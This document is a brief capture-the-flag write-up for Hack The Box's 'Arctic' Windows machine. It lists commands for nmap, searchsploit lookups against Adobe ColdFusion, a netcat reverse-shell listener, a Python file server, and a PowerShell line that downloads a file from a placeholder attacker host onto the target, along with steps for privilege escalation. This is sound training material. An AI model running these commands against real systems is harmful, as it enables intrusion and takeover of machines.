# Arctic
* Link: https://app.hackthebox.com/machines/Arctic
* Type: Windows
* Difficulty: Easy

## Commands Used
* *nmap -sC -sV -oA OUTPUTDIR IPADDRESS* - Nmap scan.
* *searchsploit --id adobe coldFusion* - Search for CVEs for adobe coldfusion.
* *nc -nlvp 4444* - Starts a listener.
* *searchsploit -m 50057* - Gets the PoC of a CVE.
* *sudo python3 windows-exploit-suggester.py --update* - Gets an updated xls file with vulnerabilities.
* *sudo python3 windows-exploit-suggester.py --database DBNAME.xls --systeminfo SYSINFOMFILE.TXT* - Provides lists of exploits for that system.
* *python -m SimpleHTTPServer PORTNUMBER* - Starts a simple HTTP server using python (Can be used to upload files to target system)

* In Windows:
  - *systeminfo* gets information about the system, most importantly,
    1. HotFixes - Indicates updates
    2. System Type - Shows the type of the system
    3. OS Version - Shows the version of the system.
  - *dir* to list files in a directory
  - *type TEXTFILENAME* reads the content of the text file.
  - *EXEFILENAME* runs the exe file.
  - *powershell -c "(new-object System.Net.WebClient).DownloadFile('http://IPADDRESS:PORTNUMBER/FILENAME', 'PATHTODOWNLOAD\FILENAME')"* - Downloads a file using PowerShell.

## Steps
* Start by checking the open ports using nmap (nmap -sC -sV -oA DIR IPADDRESS)
* There is a weird port open, check it.
* There are 2 directories, we identified the system and its version.
* Check for CVEs for that version and system.
* CVE 1 will give the password for the admin.
* CVE 2 will give a shell.
* CVE 3 after getting the shell will do priv esc.

## Why is the machine vulnerable
* The Machine is not patched/updated. 
